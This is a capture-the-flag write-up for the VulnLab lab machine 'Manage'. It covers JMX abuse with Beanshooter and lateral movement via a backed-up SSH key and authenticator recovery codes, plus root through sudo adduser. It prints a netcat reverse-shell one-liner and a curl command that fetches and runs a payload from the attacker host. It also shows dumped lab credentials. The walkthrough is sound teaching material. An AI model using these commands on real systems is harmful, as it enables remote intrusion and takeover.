---
layout: post
title: "VulnLab: Manage"
date: 2024-06-28 2000 -0500
categories:
  - writeups
  - vulnlab
tags:
  - Java-RMI
  - linux
  - sudo
image: /images/vulnlab_manage/manage.png
---
## TL;DR

Manage is an **EASY** machine on [VulnLab](https://wiki.vulnlab.com/guidance/easy/manage). This box involved abusing a Java JMX service to get command execution on the server. Once on the server, we find a backup archive that contains files from a user's home directory that we can use to move laterally. After moving to the second user, we find that we're able to run a command as root that we can use to add a new privileged user on the system. 

## Enumeration
### Nmap

```console
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=
|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh
2222/tcp  open  java-rmi   syn-ack ttl 63 Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:34355
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http       syn-ack ttl 63 Apache Tomcat 10.1.19
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/10.1.19
33337/tcp open  tcpwrapped syn-ack ttl 63
34355/tcp open  java-rmi   syn-ack ttl 63 Java RMI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```console
10.10.126.113:22
10.10.126.113:2222
10.10.126.113:8080
10.10.126.113:33337
10.10.126.113:34355
```

Right off the bat, the most interesting service is the Java-RMI service on port 2222. Note the `jmxrmi` in the nmap output. According to the Oracle documentation, the Java Management Extensions (JMX) is a standard part of the Java platform that provides a simple, standard way of managing resources such as applications, devices, and services. 

[Overview of JMX Technology](https://docs.oracle.com/javase/tutorial/jmx/overview/index.html)

Managed Beans, or MBeans, are a fundamental concept of the JMX API. The JMX specification defines five types of beans:

- Standard MBeans
- Dynamic MBeans
- Open MBeans
- Model MBeans
- MXBeans

[Introducing MBeans](https://docs.oracle.com/javase/tutorial/jmx/mbeans/index.html)

## Foothold
### Exploiting Java JMXRMI

We can use the [Beanshooter](https://github.com/qtc-de/beanshooter) tool to enumerate the `jmxrmi` service and ultimately exploit the service to get a foothold on the box.

```console
➜  manage $ beanshooter enum $ip 2222                                                                                          
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Checking available bound names:
[+]
[+]     * jmxrmi (JMX endpoint: 127.0.1.1:44703)
[+]
[+] Checking for unauthorized access:
[+]
[+]     - Remote MBean server does not require authentication.
[+]       Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+]     - Remote MBeanServer rejected the payload class.
[+]       Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+]     - 158 MBeans are currently registred on the MBean server.
[+]       Listing 136 non default MBeans:
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=numberwriter,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/host-manager)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HostManager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)

[...SNIP...]

[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username="manager",database=UserDatabase)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=responsetrailer,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=JMXProxy,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=HTMLManager,J2EEApplication=none,J2EEServer=none)
[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/)
[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/bar/name2)
[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)
[+]
[+] Enumerating tomcat users:
[+]
[+]     - Listing 2 tomcat users:
[+]
[+]             ----------------------------------------
[+]             Username:  manager
[+]             Password:  fhErvo2r9wuTEYiYgt
[+]             Roles:
[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+]             ----------------------------------------
[+]             Username:  admin
[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
[+]             Roles:
[+]                        Users:type=Role,rolename="role1",database=UserDatabase
```

After looking through the documentation, it's possible to get code execution by leveraging the `standard` MBean to execute commands on the server.

There are probably multiple ways to do this, but I put the following payload in a file and saved it as `shell.sh`

```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.2.86 9001 >/tmp/f
```

We can use `beanshooter` to grab the `shell.sh` file from our attacker machine. Please note that I have an alias set up for 'beanshooter' that runs the JAR file. 

```console
➜  manage $ beanshooter standard $ip 2222 exec 'curl http://10.8.2.86:8000/shell.sh -o /dev/shm/shell.sh'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+]     Deplyoing MBean: StandardMBean
[+]     MBean with object name de.qtc.beanshooter:standard=4573249368457 was successfully deployed.
[+]
[+]     Caught NullPointerException while invoking the newTransformer action.
[+]     This is expected bahavior and the attack most likely worked :)
[+]
[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=4573249368457 from the MBeanServer.
[+]     MBean was successfully removed.
```

Once the `shell.sh` file is on the target machine we can execute it with the following:

```console
➜  manage $ beanshooter standard $ip 2222 exec 'sh /dev/shm/shell.sh'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+]     Deplyoing MBean: StandardMBean
[+]     MBean with object name de.qtc.beanshooter:standard=4794690013321 was successfully deployed.
[+]
[+]     Caught NullPointerException while invoking the newTransformer action.
[+]     This is expected bahavior and the attack most likely worked :)
[+]
[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=4794690013321 from the MBeanServer.
[+]     MBean was successfully removed.
```

When that runs we get a shell as the `tomcat` user and can grab the `user.txt` flag from the `/opt/tomcat` directory. 
## Lateral Movement

Looking around the file system, we find a backups directory in the `/home/useradmin` folder. 

```console
tomcat@manage:/home/useradmin/backups$ ls -la
ls -la
total 12
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .
drwxr-xr-x 5 useradmin useradmin 4096 Jun 21 16:51 ..
-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz
```

We can transfer that `bacckup.tar.gz` file over to our attacker machine and extract it. once we've done that, we find what appears to be a backup of the `useradmin` home directory. 

```console
➜  backups $ ls -la
total 22
drwxrwxrwx 1 root root 4096 Jun 21 11:48 .
drwxrwxrwx 1 root root 4096 Jun 28 16:49 ..
drwxrwxrwx 1 root root    0 Jun 21 11:48 .cache
drwxrwxrwx 1 root root 4096 Jun 21 10:53 .ssh
-rwxrwxrwx 1 root root  220 Jun 21 10:46 .bash_logout
-rwxrwxrwx 1 root root 3771 Jun 21 10:46 .bashrc
-r-xr-xr-x 1 root root  200 Jun 21 11:48 .google_authenticator
-rwxrwxrwx 1 root root  807 Jun 21 10:46 .profile
-rwxrwxrwx 1 root root 3088 Jun 21 11:50 backup.tar.gz
```

That `.google_authenticator` file looks interesting. Checking that out, it seems to contain some backup codes and maybe a secret to set up Google Authenticator for generating Time-based One-Time Passwords (TOTP). Set this aside for now; we'll need these later on.

```console
➜  backups $ cat .google_authenticator
CLSSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083
20312647
73235136
92971994
86175591
98991823
54032641
69267218
76839253
56800775
```

Checking the `.ssh` directory, we find a private key. 

```console
➜  .ssh $ ls -la
total 10
drwxrwxrwx 1 root root 4096 Jun 21 10:53 .
drwxrwxrwx 1 root root 4096 Jun 21 11:48 ..
-rwxrwxrwx 1 root root   98 Jun 21 10:56 authorized_keys
-rwxrwxrwx 1 root root  411 Jun 21 10:53 id_ed25519
-rwxrwxrwx 1 root root   98 Jun 21 10:53 id_ed25519.pub
```

When trying to ssh using the key, we get prompted for a verification code. Grab one of the recovery codes from the `.google_authenticator` file and use that here. 

```console
➜  .ssh $ ssh -i id_ed25519 useradmin@$ip
The authenticity of host '10.10.93.168 (10.10.93.168)' can't be established.
ED25519 key fingerprint is SHA256:mTJofQVp4T/1uO1CFsfPt8SADZfjbzIIynR0Zeqi0qo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.168' (ED25519) to the list of known hosts.
(useradmin@10.10.93.168) Verification code:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jun 28 10:12:35 PM UTC 2024

  System load:  0.0               Processes:             111
  Usage of /:   74.4% of 6.06GB   Users logged in:       0
  Memory usage: 39%               IPv4 address for ens5: 10.10.93.168
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Jun 21 16:48:53 2024 from 192.168.94.139
useradmin@manage:~$
```

## Privilege Escalation

Checking to see what the `useradmin` user can run as root, we see that we're able to run `adduser`, but we're limited to alphanumeric characters, so no passing arguments like `--uid`. 

```console
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

We're given a hint on this box to look at the default Ubuntu sudoers file. When we do, we see that members of the `admin` group may gain root privileges

```console
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
```

Since we know that when a new user is created, a matching group is created (by default), if we add an `admin` user, then the `admin` group should be added and the `admin` user will be added automatically. 

```console
useradmin@manage:~$ sudo /usr/sbin/adduser admin
Adding user `admin' ...
Adding new group `admin' (1003) ...
Adding new user `admin' (1003) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
        Full Name []: Admin
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n]
```

After switching to the admin user and running `sudo -l` again, we see that we can run any command as root.

```console
admin@manage:/home/useradmin$ sudo -l
[sudo] password for admin:
Matching Defaults entries for admin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User admin may run the following commands on manage:
    (ALL) ALL
```

We can use `sudo su` to become root and grab the root flag. 

```console
root@manage:~# ls -la
total 40
drwx------  6 root root 4096 Jun 22 15:15 .
drwxr-xr-x 19 root root 4096 Mar  1 04:20 ..
lrwxrwxrwx  1 root root    9 Jun 21 16:52 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Mar  1 20:14 .cache
-r--------  1 root root  200 Jun 22 15:12 .google_authenticator
drwxr-xr-x  3 root root 4096 Jun 21 15:19 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   37 Mar  1 07:29 root.txt
drwx------  3 root root 4096 Mar  1 04:23 snap
drwx------  2 root root 4096 Jun 21 15:26 .ssh
-rw-r--r--  1 root root    0 Mar  1 04:35 .sudo_as_admin_successful
```